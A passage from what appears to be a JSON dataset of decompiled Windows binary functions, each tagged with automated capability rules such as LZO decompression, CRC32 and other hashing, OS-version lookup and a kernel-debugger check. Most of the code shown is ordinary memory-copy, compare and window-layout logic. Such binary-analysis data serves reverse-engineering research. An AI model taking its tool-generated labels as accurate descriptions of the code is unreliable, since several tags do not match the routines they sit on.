*(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x4108d4:\ncode_r0x004108d4:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x410898\n            switch(*(arg_10h * 4 + 0x410898)) {\n            case 0x4108b0:\n                goto code_r0x004108b0;\n            case 0x4108c0:\n                goto code_r0x004108c0;\n            case 0x4108d4:\n                goto code_r0x004108d4;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x41079c)) {\n            case 0x4107ac:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x00410774:\n    // WARNING: Could not recover jumptable at 0x00410776. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x410848\n                    puVar1 = (**(uVar3 * -4 + 0x410848))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x410898)) {\n                case 0x4108b0:\n                    goto code_r0x004108b0;\n                case 0x4108c0:\n                    goto code_r0x004108c0;\n                case 0x4108d4:\n                    goto code_r0x004108d4;\n                }\n                break;\n            case 0x4107d0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x00410774;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x410898)) {\n                case 0x4108b0:\n                    goto code_r0x004108b0;\n                case 0x4108c0:\n                    goto code_r0x004108c0;\n                case 0x4108d4:\n                    goto code_r0x004108d4;\n                }\n                break;\n            case 0x4107f8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x00410774;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x410898)) {\n                case 0x4108b0:\n                    goto code_r0x004108b0;\n                case 0x4108c0:\n                    goto code_r0x004108c0;\n                case 0x4108d4:\n                    goto code_r0x004108d4;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x0041060c;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x4106fc\n        switch(*((arg_10h & 3) * 4 + 0x4106fc)) {\n        case 0x410714:\ncode_r0x00410714:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x410720:\ncode_r0x00410720:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x410734:\ncode_r0x00410734:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x41070c)) {\n        case 0x410714:\n            goto code_r0x00410714;\n        case 0x410720:\n            goto code_r0x00410720;\n        case 0x410734:\n            goto code_r0x00410734;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x410610)) {\n        case 0x410620:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x0041060c:\n    // WARNING: Could not recover jumptable at 0x0041060c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x410690\n                puVar1 = (**(uVar2 * 4 + 0x410690))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4106fc)) {\n            case 0x410714:\n                goto code_r0x00410714;\n            case 0x410720:\n                goto code_r0x00410720;\n            case 0x410734:\n                goto code_r0x00410734;\n            }\n            break;\n        case 0x41064c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x0041060c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4106fc)) {\n            case 0x410714:\n                goto code_r0x00410714;\n            case 0x410720:\n                goto code_r0x00410720;\n            case 0x410734:\n                goto code_r0x00410734;\n            }\n            break;\n        case 0x410670:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x0041060c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4106fc)) {\n            case 0x410714:\n                goto code_r0x00410714;\n            case 0x410720:\n                goto code_r0x00410720;\n            case 0x410734:\n                goto code_r0x00410734;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2657
    },
    "00411850": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t * fcn.00411850(uint32_t *param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    uVar1 = param_2;\n    puVar4 = param_1;\n    if (3 < param_3) {\n        uVar2 = -param_1 & 3;\n        uVar3 = param_3;\n        if (uVar2 != 0) {\n            uVar3 = param_3 - uVar2;\n            do {\n                *puVar4 = param_2;\n                puVar4 = puVar4 + 1;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar1 = uVar1 * 0x1010101;\n        param_3 = uVar3 & 3;\n        uVar3 = uVar3 >> 2;\n        if (uVar3 != 0) {\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = uVar1;\n                puVar4 = puVar4 + 1;\n            }\n            if (param_3 == 0) {\n                return param_1;\n            }\n        }\n    }\n    do {\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        param_3 = param_3 - 1;\n    } while (param_3 != 0);\n    return param_1;\n}\n",
        "token_count": 386
    },
    "00411970": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00411970(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x00411b34;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x411c58\n            switch(*((arg_10h & 3) * 4 + 0x411c58)) {\n            case 0x411c70:\ncode_r0x00411c70:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x411c80:\ncode_r0x00411c80:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x411c94:\ncode_r0x00411c94:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x411c58\n            switch(*(arg_10h * 4 + 0x411c58)) {\n            case 0x411c70:\n                goto code_r0x00411c70;\n            case 0x411c80:\n                goto code_r0x00411c80;\n            case 0x411c94:\n                goto code_r0x00411c94;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x411b5c)) {\n            case 0x411b6c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x00411b34:\n    // WARNING: Could not recover jumptable at 0x00411b36. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x411c08\n                    puVar1 = (**(uVar3 * -4 + 0x411c08))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x411c58)) {\n                case 0x411c70:\n                    goto code_r0x00411c70;\n                case 0x411c80:\n                    goto code_r0x00411c80;\n                case 0x411c94:\n                    goto code_r0x00411c94;\n                }\n                break;\n            case 0x411b90:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x00411b34;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x411c58)) {\n                case 0x411c70:\n                    goto code_r0x00411c70;\n                case 0x411c80:\n                    goto code_r0x00411c80;\n                case 0x411c94:\n                    goto code_r0x00411c94;\n                }\n                break;\n            case 0x411bb8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x00411b34;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x411c58)) {\n                case 0x411c70:\n                    goto code_r0x00411c70;\n                case 0x411c80:\n                    goto code_r0x00411c80;\n                case 0x411c94:\n                    goto code_r0x00411c94;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x004119cc;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x411abc\n        switch(*((arg_10h & 3) * 4 + 0x411abc)) {\n        case 0x411ad4:\ncode_r0x00411ad4:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x411ae0:\ncode_r0x00411ae0:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x411af4:\ncode_r0x00411af4:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x411acc)) {\n        case 0x411ad4:\n            goto code_r0x00411ad4;\n        case 0x411ae0:\n            goto code_r0x00411ae0;\n        case 0x411af4:\n            goto code_r0x00411af4;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x4119d0)) {\n        case 0x4119e0:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x004119cc:\n    // WARNING: Could not recover jumptable at 0x004119cc. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x411a50\n                puVar1 = (**(uVar2 * 4 + 0x411a50))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x411abc)) {\n            case 0x411ad4:\n                goto code_r0x00411ad4;\n            case 0x411ae0:\n                goto code_r0x00411ae0;\n            case 0x411af4:\n                goto code_r0x00411af4;\n            }\n            break;\n        case 0x411a0c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x004119cc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x411abc)) {\n            case 0x411ad4:\n                goto code_r0x00411ad4;\n            case 0x411ae0:\n                goto code_r0x00411ae0;\n            case 0x411af4:\n                goto code_r0x00411af4;\n            }\n            break;\n        case 0x411a30:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x004119cc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x411abc)) {\n            case 0x411ad4:\n                goto code_r0x00411ad4;\n            case 0x411ae0:\n                goto code_r0x00411ae0;\n            case 0x411af4:\n                goto code_r0x00411af4;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2682
    },
    "00412110": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t fcn.00412110(uint32_t *param_1, uint32_t *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    bool bVar9;\n    \n    uVar3 = param_3;\n    if (param_3 != 0) {\n        if (((param_1 | param_2) & 3) == 0) {\n            uVar3 = param_3 & 3;\n            param_3 = param_3 >> 2;\n            bVar9 = param_3 == 0;\n            puVar7 = param_1;\n            puVar8 = param_2;\n            if (!bVar9) {\n                do {\n                    param_1 = puVar7;\n                    param_2 = puVar8;\n                    if (param_3 == 0) break;\n                    param_3 = param_3 - 1;\n                    param_2 = puVar8 + 1;\n                    param_1 = puVar7 + 1;\n                    bVar9 = *puVar7 == *puVar8;\n                    puVar7 = param_1;\n                    puVar8 = param_2;\n                } while (bVar9);\n                if (!bVar9) {\n                    uVar3 = param_1[-1];\n                    uVar1 = param_2[-1];\n                    bVar9 = uVar3 < uVar1;\n                    if (((uVar3 == uVar1) &&\n                        (uVar5 = uVar3 >> 8,  uVar6 = uVar1 >> 8,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) &&\n                       (uVar5 = uVar3 >> 0x10,  uVar6 = uVar1 >> 0x10,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) {\n                        bVar9 = uVar3 >> 0x18 < uVar1 >> 0x18;\n                    }\n                    goto code_r0x00412190;\n                }\n            }\n            if (uVar3 != 0) {\n                uVar1 = *param_1;\n                uVar2 = *param_2;\n                bVar9 = uVar1 < uVar2;\n                if (uVar1 != uVar2) {\ncode_r0x00412190:\n                    return (1 - bVar9) - (bVar9 != 0);\n                }\n                uVar4 = uVar3 - 1;\n                if (uVar4 != 0) {\n                    uVar5 = uVar2 >> 8;\n                    uVar6 = uVar1 >> 8;\n                    bVar9 = uVar6 < uVar5;\n                    if (uVar6 != uVar5) goto code_r0x00412190;\n                    uVar4 = uVar3 - 2;\n                    if (uVar4 != 0) {\n                        bVar9 = (uVar1 & 0xff0000) < (uVar2 & 0xff0000);\n                        if ((uVar1 & 0xff0000) != (uVar2 & 0xff0000)) goto code_r0x00412190;\n                        uVar4 = uVar3 - 3;\n                    }\n                }\n                return uVar4;\n            }\n        }\n        else {\n            if ((param_3 & 1) == 0) goto code_r0x00412143;\n            bVar9 = *param_1 < *param_2;\n            if (*param_1 != *param_2) goto code_r0x00412190;\n            param_1 = param_1 + 1;\n            param_2 = param_2 + 1;\n            for (param_3 = param_3 - 1; uVar3 = param_3,  param_3 != 0; param_3 = param_3 - 2) {\ncode_r0x00412143:\n                bVar9 = *param_1 < *param_2;\n                if ((*param_1 != *param_2) ||\n                   (bVar9 = *(param_1 + 1) < *(param_2 + 1),  *(param_1 + 1) != *(param_2 + 1))) goto code_r0x00412190;\n                param_2 = param_2 + 2;\n                param_1 = param_1 + 2;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1039
    },
    "0041e396": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e396(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    uVar1 = fcn.0041e344();\n    iVar2 = (**0x4674f8)(uVar1, (-(*0x4674e8 != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar2 == 0) {\n        *0x4674d8 = 0;\n    }\n    else {\n        iVar2 = fcn.00420705(*0x4674ec, &var_7ch);\n        if ((iVar2 == 0) && (iVar2 = fcn.0041e243(uVar1),  iVar2 != 0)) {\n            *0x4674d8 = *0x4674d8 | 4;\n            *0x4674dc = uVar1;\n            *0x4674e0 = uVar1;\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 271
    },
    "0041e49b": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e49b(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint arg_ch;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    arg_8h_00 = fcn.0041e344();\n    iVar1 = (**0x4674f8)(arg_8h_00, (-(*0x4674e8 != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x4674d8 = 0;\n        goto code_r0x0041e6a8;\n    }\n    iVar1 = fcn.00420705(*0x4674ec, &var_7ch);\n    if (iVar1 == 0) {\n        iVar1 = (**0x4674f8)(arg_8h_00, (-(*0x4674e4 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00420705(*0x4674f4, &var_7ch);\n            if (iVar1 == 0) {\n                *0x4674d8 = *0x4674d8 | 0x304;\n                *0x4674dc = arg_8h_00;\n                *0x4674e0 = arg_8h_00;\n            }\n            else if ((*0x4674d8 & 2) == 0) {\n                if ((*0x4674f0 == 0) || (iVar1 = fcn.0042076e(*0x4674f4, &var_7ch, *0x4674f0),  iVar1 != 0)) {\n                    if (((*0x4674d8 & 1) == 0) && (iVar1 = fcn.0041e243(arg_8h_00),  iVar1 != 0)) {\n                        *0x4674d8 = *0x4674d8 | 1;\n                        *0x4674e0 = arg_8h_00;\n                    }\n                }\n                else {\n                    *0x4674d8 = *0x4674d8 | 2;\n                    *0x4674e0 = arg_8h_00;\n                    iVar1 = fcn.00411cb0(*0x4674f4);\n                    if (iVar1 == *0x4674f0) {\n                        *0x4674dc = arg_8h_00;\n                    }\n                }\n            }\n            goto code_r0x0041e5c6;\n        }\ncode_r0x0041e5fa:\n        *0x4674d8 = 0;\n        goto code_r0x0041e6a8;\n    }\ncode_r0x0041e5c6:\n    if ((*0x4674d8 & 0x300) == 0x300) goto code_r0x0041e6a8;\n    iVar1 = (**0x4674f8)(arg_8h_00, (-(*0x4674e4 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) goto code_r0x0041e5fa;\n    iVar1 = fcn.00420705(*0x4674f4, &var_7ch);\n    if (iVar1 == 0) {\n        *0x4674d8 = *0x4674d8 | 0x200;\n        if (((*0x4674e4 == 0) && (*0x4674f0 != 0)) && (iVar1 = fcn.00411cb0(*0x4674f4),  iVar1 == *0x4674f0)) {\n            arg_ch = 1;\n            goto code_r0x0041e678;\n        }\n    }\n    else {\n        if (((*0x4674e4 != 0) || (*0x4674f0 == 0)) ||\n           (iVar1 = fcn.0042076e(*0x4674f4, &var_7ch, *0x4674f0),  iVar1 != 0)) goto code_r0x0041e6a8;\n        arg_ch = 0;\ncode_r0x0041e678:\n        iVar1 = fcn.0041e42a(arg_8h_00, arg_ch);\n        if (iVar1 == 0) goto code_r0x0041e6a8;\n    }\n    *0x4674d8 = *0x4674d8 | 0x100;\n    if (*0x4674dc == 0) {\n        *0x4674dc = arg_8h_00;\n    }\ncode_r0x0041e6a8:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1150
    },
    "00403ad0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "get OS version"
        ],
        "decompiled_code": "\nvoid fcn.00403ad0(uint param_1, uint param_2, uint param_3)\n\n{\n    uint8_t extraout_var;\n    \n    if ((*0x464fec & 1) == 0) {\n        *0x464fec = *0x464fec | 1;\n        (*_sym.imp.KERNEL32.dll_GetVersion)();\n        *0x464fe9 = extraout_var >> 7;\n    }\n    if (*0x464fe9 == 0) {\n        param_2 = param_3;\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(param_1, param_2);\n    return;\n}\n",
        "token_count": 144
    },
    "00405bb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00405bb0(int32_t param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t unaff_retaddr;\n    uchar *puStack116;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uchar auStack48 [4];\n    uint uStack44;\n    uchar auStack40 [4];\n    uint32_t uStack36;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    uchar *puStack12;\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    puStack12 = *in_FS_OFFSET;\n    iStack4 = -1;\n    iStack8 = 0x44b058;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    iVar3 = (*_sym.imp.USER32.dll_IsWindow)();\n    if ((iVar3 != 0) && (*(param_1 + 0x74) != 0)) {\n        uStack88 = *(param_1 + 0x1c);\n        puStack84 = &stack0xffffffd0;\n        puStack92 = 0x405c02;\n        (*_sym.imp.USER32.dll_GetWindowRect)();\n        uStack96 = *(param_1 + 0x1c);\n        puStack92 = &stack0xffffffd8;\n        puStack100 = 0x405c11;\n        (*_sym.imp.USER32.dll_GetClientRect)();\n        puStack100 = &stack0xffffffd0;\n        uStack104 = 0x405c1d;\n        fcn.0043344f();\n        uStack104 = *(param_1 + 0x1c);\n        uStack108 = 0x405c27;\n        uStack108 = (*_sym.imp.USER32.dll_GetParent)();\n        iVar3 = fcn.0042b432();\n        if (iVar3 != 0) {\n            fcn.00433413(&stack0xffffffb4);\n            puStack116 = &stack0xffffffc0;\n            fcn.00433413();\n        }\n        piVar4 = fcn.004290ee();\n        iVar3 = (**(*piVar4 + 0xc))();\n        puStack100 = iVar3 + 0x10;\n        uStack44 = 0;\n        fcn.0042c413();\n        iVar3 = *(param_1 + 0x1c);\n        uVar5 = (*_sym.imp.USER32.dll_GetDC)();\n        piVar4 = fcn.0043374e(uVar5);\n        (**(*piVar4 + 0x28))(param_1 + 0x7c);\n        (*_sym.imp.GDI32.dll_GetTextExtentPoint32A)(piVar4[2], puStack116, *(puStack116 + -0xc), &stack0xffffff94);\n        (**(*piVar4 + 0x28))(uVar5);\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(param_1 + 0x1c), piVar4[1]);\n        puVar2 = puStack12;\n        iVar3 = iVar3 + ((iStack16 - unaff_retaddr) - iStack24) + iStack8;\n        iVar6 = (iStack4 - param_2) - iStack20;\n        uStack36 = fcn.0042dd19();\n        pcVar1 = _sym.imp.USER32.dll_InflateRect;\n        if ((uStack36 & 0x200) == 0) {\n            puStack12 = &stack0xffffff9c + puVar2 + iStack20 + iVar6;\n        }\n        else {\n            (*_sym.imp.USER32.dll_InflateRect)();\n        }\n        if ((uStack36 & 1) == 0) {\n            if ((uStack36 & 2) == 0) {\n                iStack16 = iVar3 + iStack24;\n            }\n            else {\n                iStack24 = iStack16 - iVar3;\n            }\n        }\n        else {\n            (*pcVar1)();\n        }\n        iVar6 = puStack12 - iStack20;\n        puStack84 = 0x405da5;\n        fcn.0042e037(0, iStack24, iStack20, iStack16 - iStack24, iVar6, 4);\n        iStack8 = 0xffffffff;\n        piVar4 = iVar6 + -4;\n        LOCK();\n        iVar3 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n        if (iVar3 == 1 || iVar3 + -1 < 0) {\n            (**(**(iVar6 + -0x10) + 4))();\n        }\n    }\n    *in_FS_OFFSET = iStack16;\n    return;\n}\n",
        "token_count": 1120
    },
    "004092c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004092c0(int32_t param_1, uint32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h;\n    uint arg_18h;\n    uint arg_1ch;\n    int32_t iVar7;\n    \n    *(param_1 + 0x50) = param_3;\n    fcn.00409170();\n    *(param_1 + 0x13c) = ~param_2 & 1;\n    arg_1ch = 0x44da68;\n    arg_18h = 0;\n    arg_14h = 0;\n    arg_10h = 0;\n    arg_ch = 3;\n    uVar4 = fcn.0042a818(3, 0, 0, 0);\n    iVar5 = fcn.0042a678(uVar4, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, param_2);\n    if (iVar5 != 0) {\n        iVar7 = iVar5;\n        fcn.00408070();\n        if ((param_1 != -0xd4) && (*(param_1 + 0xd8) != 0)) {\n            (*_sym.imp.GDI32.dll_GetObjectA)(*(param_1 + 0xd8), 0x18, &stack0xffffffbc);\n            *(param_1 + 0x60) = arg_ch;\n            *(param_1 + 0x5c) = arg_10h;\n            iVar5 = iVar7;\n            (*_sym.imp.USER32.dll_GetClientRect)(*(param_1 + 0x1c), param_1 + 0x84);\n            iVar7 = *(param_1 + 0x84);\n            iVar6 = *(param_1 + 0x88);\n            iVar1 = *(param_1 + 0x90);\n            *(param_1 + 0x94) = iVar7;\n            *(param_1 + 0x98) = iVar6;\n            *(param_1 + 0x9c) = iVar7 + *(param_1 + 0x60);\n            iVar2 = *(param_1 + 0x8c);\n            *(param_1 